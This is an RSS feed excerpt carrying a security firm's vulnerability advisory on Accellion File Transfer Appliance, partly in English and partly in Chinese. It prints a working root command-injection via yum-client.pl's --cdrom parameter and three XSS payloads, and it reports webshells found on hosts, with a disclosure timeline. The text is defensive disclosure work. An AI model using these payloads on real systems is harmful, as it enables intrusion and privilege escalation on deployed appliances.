bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh -i id_dsa -o &lt;span class=&quot;nv&quot;&gt;UserKnownHostsFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/dev/null -o &lt;span class=&quot;nv&quot;&gt;StrictHostKeyChecking&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;no soggycat@localhost id
Could not create directory &lt;span class=&quot;s1&quot;&gt;&amp;#39;/.ssh&amp;#39;&lt;/span&gt;.
Warning: Permanently added &lt;span class=&quot;s1&quot;&gt;&amp;#39;0,0.0.0.0&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; to the list of known hosts.
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;520&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;soggycat&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;2-command-injection-in-yum-clientpl&quot;&gt;2. Command Injection in â€œyum-client.plâ€&lt;/h5&gt;

&lt;p&gt;To enable system updates through web UI, the sudoers configuration in FTA exceptionally allows the user nobody to directly execute commands with root privileges and update software with the program &lt;code class=&quot;highlighter-rouge&quot;&gt;yum-client.pl&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;/etc/sudoers&lt;/div&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-apache&quot; data-lang=&quot;apache&quot;&gt;...
&lt;span class=&quot;nb&quot;&gt;Cmnd_Alias&lt;/span&gt;      YUM_UPGRADE = &lt;span class=&quot;sx&quot;&gt;/usr/bin/yum&lt;/span&gt; -y upgrade
&lt;span class=&quot;nb&quot;&gt;Cmnd_Alias&lt;/span&gt;      YUM_CLIENT = &lt;span class=&quot;sx&quot;&gt;/usr/local/bin/yum-client.pl&lt;/span&gt;
...
&lt;span class=&quot;c&quot;&gt;# User privilege specification&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;root&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;ALL&lt;/span&gt;=(ALL) &lt;span class=&quot;k&quot;&gt;ALL&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;admin&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;ALL&lt;/span&gt; =NOPASSWD: UPDATE_DNS, UPDATE_GW, UPDATE_NTP, RESTART_NETWORK, CHMOD_OLDTEMP ...
&lt;span class=&quot;nb&quot;&gt;nobody&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;ALL&lt;/span&gt; =NOPASSWD: SSL_SYSTEM, ADMIN_SYSTEM, IPSEC_CMD, YUM_CLIENT
&lt;span class=&quot;nb&quot;&gt;soggycat&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ALL&lt;/span&gt; =NOPASSWD: ADMIN_SYSTEM, IPSEC_CMD, CHOWN_IPSEC, UPDATE_IPSEC, YUM_CLIENT
&lt;span class=&quot;nb&quot;&gt;radmin&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;ALL&lt;/span&gt; =NOPASSWD: RESET_APPL
...&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;YUM_CLIENT&lt;/code&gt; is the command for proceeding updates. Part of the codes are as follows:&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;/usr/local/bin/yum-client.pl&lt;/div&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-perl&quot; data-lang=&quot;perl&quot;&gt;&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;GetOptions&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
   &lt;span class=&quot;s&quot;&gt;&amp;#39;help&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$help&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;s&quot;&gt;&amp;#39;download_only&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$download_only&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;s&quot;&gt;&amp;#39;list&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;s&quot;&gt;&amp;#39;cache&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;s&quot;&gt;&amp;#39;clearcache&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$clearcache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;s&quot;&gt;&amp;#39;cdrom=s&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cdrom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;s&quot;&gt;&amp;#39;appid=s&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$appid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;s&quot;&gt;&amp;#39;servername=s&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$servername&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;s&quot;&gt;&amp;#39;version=s&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$version&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;s&quot;&gt;&amp;#39;token=s&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$YUM_CMD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;/usr/bin/yum&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
  &lt;span class=&quot;nv&quot;&gt;$YUM_CMD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;$YUM_CMD -C&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# if this is based on RHEL 5, change the repository&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$OS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sb&quot;&gt;`grep -q 5 /etc/redhat-release &amp;amp;&amp;amp; echo -n 5`&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$LOGFILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;/home/seos/log/yum-client.log&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$STATUSFILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;/home/seos/log/yum-client.status&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$YUMCONFIG&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;/etc/yum.conf&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$YUMDIFF_FILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;/home/seos/log/yum.diff&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cdrom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$OS&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;eq&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;5&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
     &lt;span class=&quot;nv&quot;&gt;$YUM_CMD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;$YUM_CMD -c $cdrom_path/yum.conf-5&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
     &lt;span class=&quot;nv&quot;&gt;$YUM_CMD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;$YUM_CMD -c $cdrom_path/yum.conf&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;mkdir -p /mnt/cdrom &amp;amp;&amp;amp; mount -o loop $cdrom $cdrom_path&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fdielog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$LOGFILE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;unable to mount: $!&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;After taking a closer look on &lt;code class=&quot;highlighter-rouge&quot;&gt;ymm-client.pl&lt;/code&gt;, a Command Injection vulnerability was found on the parameter &lt;code class=&quot;highlighter-rouge&quot;&gt;--cdrom&lt;/code&gt;. This vulnerability enables attackers to inject any commands into the parameter and execute as root.&lt;/p&gt;

&lt;p&gt;Thus, using the commands below&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;id
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo /usr/local/bin/yum-client.pl --cdrom&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;$(id &amp;gt; /tmp/.gg)&amp;#39;&lt;/span&gt;

mount: can&lt;span class=&quot;err&quot;&gt;&amp;#39;&lt;/span&gt;t find /mnt/cdrom in /etc/fstab or /etc/mtab
unable to mount: Bad file descriptor at /usr/local/bin/yum-client.pl line 113.

bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;cat /tmp/.gg
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;bin&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,2&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;daemon&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,3&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sys&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,4&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;adm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,6&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;disk&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,10&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;wheel&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;will grant execution freely as root!  &lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;backdoor&quot;&gt;Backdoor&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
After gaining the highest privilege and carrying out server recon, we identified that several backdoors had been already planted in FTA hosts. One of them is an IRC Botnet which had been mentioned in Niaraâ€™s &lt;a href=&quot;http://www.niara.com/docs/ta-accellion-fta-cve-2015-2857.pdf&quot;&gt;Accellion File Transfer Appliance Vulnerability&lt;/a&gt;.  &lt;br /&gt;
Apart from that, two additional PHP Webshells of different types which had NEVER been noted in public reports were also identified. Through reviewing Apache Log, these backdoors might be placed by exploiting the CVE-2015-2857 vulnerability discovered in mid-2015.&lt;/p&gt;

&lt;p&gt;One of the backdoors is PHPSPY, it is found on 62 of the online hosts globally. It was placed in&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://&amp;lt;fta&amp;gt;/courier/themes/templates/Redirector_Cache.php&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The other is WSO, found on 9 of the online hosts globally, placed in&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://&amp;lt;fta&amp;gt;/courier/themes/templates/imag.php&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;acknowledgement&quot;&gt;Acknowledgement&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
The vulnerability mentioned in this Advisory was identified in early 2016 while looking for vulnerabilities in Facebook, you can refer to the article â€œ&lt;a href=&quot;https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/&quot;&gt;How I Hacked Facebook, and Found Someoneâ€™s Backdoor Script&lt;/a&gt;â€.  &lt;br /&gt;
Upon discovering the FTA vulnerability in early February, I notified Facebook and Accellion and both were very responsive. Accellion responded immediately, issuing patch FTA_9_12_40 on February 12th and notifying all affected customers about the vulnerability and instructions to install the patch. Accellion has been very communicative and cooperative throughout this process.  &lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;timeline&quot;&gt;Timeline&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Feb  6, 2016 05:21 Contact Accellion for vulnerability report&lt;/li&gt;
  &lt;li&gt;Feb  7, 2016 12:35 Send the report to Accellion Support Team&lt;/li&gt;
  &lt;li&gt;Mar  3, 2016 03:03 Accellion Support Team notifies patch will be made in FTA_9_12_40&lt;/li&gt;
  &lt;li&gt;May 10, 2016 15:18 Request Advisory submission approval and report the new discovery of two backdoors to Accellion&lt;/li&gt;
  &lt;li&gt;Jun  6, 2016 10:20 Advisory finalized by mutual consent&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;references&quot;&gt;References&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://community.rapid7.com/community/metasploit/blog/2015/07/10/r7-2015-08-accellion-file-transfer-appliance-vulnerabilities-cve-2015-2856-cve-2015-2857&quot;&gt;R7-2015-08: Accellion File Transfer Appliance Vulnerabilities (CVE-2015-2856, CVE-2015-2857)&lt;/a&gt; &lt;a name=&quot;ref1&quot;&gt;&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.rapid7.com/resources/advisories/R7-0039.jsp&quot;&gt;Rapid7 Advisory R7-0039: Accellion File Transfer Appliance Multiple Vulnerabilities&lt;/a&gt; &lt;a name=&quot;ref2&quot;&gt;&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.niara.com/docs/ta-accellion-fta-cve-2015-2857.pdf&quot;&gt;Threat Advisory: Accellion File Transfer Appliance Vulnerability&lt;/a&gt; &lt;a name=&quot;ref3&quot;&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability-eng-ver/</link>
                <guid>https://devco.re/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability-eng-ver</guid>
                <pubDate>Thu, 22 Sep 2016 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Accellion File Transfer Appliance å¼±é»å ±å‘Š</title>
                <description>&lt;p&gt;By &lt;a href=&quot;http://blog.orange.tw/&quot;&gt;Orange Tsai&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability-eng-ver/&quot;&gt;English Version&lt;/a&gt;   &lt;br /&gt;
&lt;a href=&quot;/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability/&quot;&gt;ä¸­æ–‡ç‰ˆæœ¬&lt;/a&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;accellion-fta-ä»‹ç´¹&quot;&gt;Accellion FTA ä»‹ç´¹&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
Accellion File Transfer Appliance (ä»¥ä¸‹ç°¡ç¨± FTA) ç‚ºä¸€æ¬¾å®‰å…¨æª”æ¡ˆå‚³è¼¸æœå‹™ï¼Œå¯è®“ä½¿ç”¨è€…ç·šä¸Šåˆ†äº«ã€åŒæ­¥æª”æ¡ˆï¼Œä¸”æ‰€æœ‰æª”æ¡ˆçš†ç¶“ AES 128/256 åŠ å¯†ï¼ŒEnterprise ç‰ˆæœ¬æ›´æ”¯æ´ SSL VPN æœå‹™ä¸¦æ•´åˆ AD, LDAP, Kerberos ç­‰ Single Sign-on æ©Ÿåˆ¶ã€‚&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;æ¼æ´æè¿°&quot;&gt;æ¼æ´æè¿°&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
åœ¨ç ”ç©¶éç¨‹ä¸­ï¼Œæ–¼ FTA ç‰ˆæœ¬ FTA_9_12_0 (13-Oct-2015 Release) ä¸Šï¼Œç™¼ç¾äº†ä¸‹åˆ—å¼±é»ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Cross-Site Scripting x 3&lt;/li&gt;
  &lt;li&gt;Pre-Auth SQL Injection leads to Remote Code Execution&lt;/li&gt;
  &lt;li&gt;Known-Secret-Key leads to Remote Code Execution&lt;/li&gt;
  &lt;li&gt;Local Privilege Escalation x 2&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ä»¥ä¸Šå¼±é»å¯ä½¿ä¸éœ€ç¶“éèªè­‰çš„æ”»æ“Šè€…ï¼ŒæˆåŠŸé ç«¯æ”»æ“Š FTA ä¼ºæœå™¨ä¸¦å–å¾—æœ€é«˜æ¬Šé™ï¼Œç•¶æ”»æ“Šè€…å®Œå…¨æ§åˆ¶ä¼ºæœå™¨å¾Œï¼Œå¯å–å¾—ä¼ºæœå™¨ä¸Šçš„åŠ å¯†æª”æ¡ˆèˆ‡ç”¨æˆ¶è³‡æ–™ç­‰ã€‚&lt;/p&gt;

&lt;p&gt;å¼±é»ç¶“å›å ± CERT/CC å¾Œå–å¾—å…±å››å€‹ç¨ç«‹ CVE ç·¨è™Ÿ (CVE-2016-2350, CVE-2016-2351, CVE-2016-2352, CVE-2016-2353)ã€‚&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;å½±éŸ¿ç¯„åœ&quot;&gt;å½±éŸ¿ç¯„åœ&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
æ ¹æ“šå…¬é–‹è³‡æ–™æƒæï¼Œå…¨çƒå…±ç™¼ç¾ 1217 å° FTA å­˜æ´»ä¸»æ©Ÿï¼Œä¸»è¦åˆ†å¸ƒåœ°é»ç‚ºç¾åœ‹ï¼Œå…¶æ¬¡åŠ æ‹¿å¤§ã€æ¾³æ´²ã€è‹±åœ‹èˆ‡æ–°åŠ å¡ã€‚æ ¹æ“šå­˜æ´»ä¸»æ©Ÿçš„åŸŸåã€SSL Certificate ç™¼ç¾ FTA ä½¿ç”¨å®¢æˆ¶éåŠæ”¿åºœã€æ•™è‚²ã€ä¼æ¥­ç­‰é ˜åŸŸï¼Œå…¶ä¸­ä¸ä¹ä¸€äº›çŸ¥åå“ç‰Œã€‚&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;æ¼æ´åˆ†æèˆ‡åˆ©ç”¨&quot;&gt;æ¼æ´åˆ†æèˆ‡åˆ©ç”¨&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;multiple-cross-site-scripting-cve-2016-2350&quot;&gt;Multiple Cross-Site Scripting (CVE-2016-2350)&lt;/h4&gt;

&lt;h5 id=&quot;1-xss-in-move_partition_framehtml&quot;&gt;1. XSS in move_partition_frame.html&lt;/h5&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://&amp;lt;fta&amp;gt;/courier/move_partition_frame.html&lt;br /&gt;&lt;br /&gt;
?f2=â€™-prompt(document.domain);//&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h5 id=&quot;2-xss-in-getimageajaxphp&quot;&gt;2. XSS in getimageajax.php&lt;/h5&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://&amp;lt;fta&amp;gt;/courier/web/getimageajax.php&lt;br /&gt;&lt;br /&gt;
?documentname=â€onerror=â€prompt(document.domain)//&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h5 id=&quot;3-xss-in-wminfohtml&quot;&gt;3. XSS in wmInfo.html&lt;/h5&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://&amp;lt;fta&amp;gt;/courier/web/wmInfo.html&lt;br /&gt;&lt;br /&gt;
?msg=ssologout&lt;br /&gt;&lt;br /&gt;
&amp;amp;loginurl=â€&amp;gt;&amp;lt;svg/onload=â€prompt(document.domain)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;pre-auth-sql-injection-leads-to-rce-cve-2016-2351&quot;&gt;Pre-Auth SQL Injection leads to RCE (CVE-2016-2351)&lt;/h4&gt;

&lt;p&gt;ç¶“éä»£ç¢¼å¯©æŸ¥å¾Œï¼Œåœ¨ FTA ä¸­ç™¼ç¾ä¸€å€‹ä¸é ˆé©—è­‰çš„ SQL Injectionï¼Œé€™ä½¿å¾—æƒ¡æ„ä½¿ç”¨è€…å¯é€é SQL Injection å­˜å–ä¼ºæœå™¨çš„æ•æ„Ÿæª”æ¡ˆåŠå€‹äººè³‡æ–™ï¼Œä¸¦é…åˆæ¬Šé™è¨­å®šå•é¡Œå°è‡´é ç«¯ä»£ç¢¼åŸ·è¡Œã€‚å•é¡Œå‡ºåœ¨ security_key2.api ä¸­æ‰€å‘¼å«åˆ°çš„ &lt;code class=&quot;highlighter-rouge&quot;&gt;client_properties( ... )&lt;/code&gt; å‡½æ•¸ä¸­ï¼&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;/home/seos/courier/security_key2.api&lt;/div&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
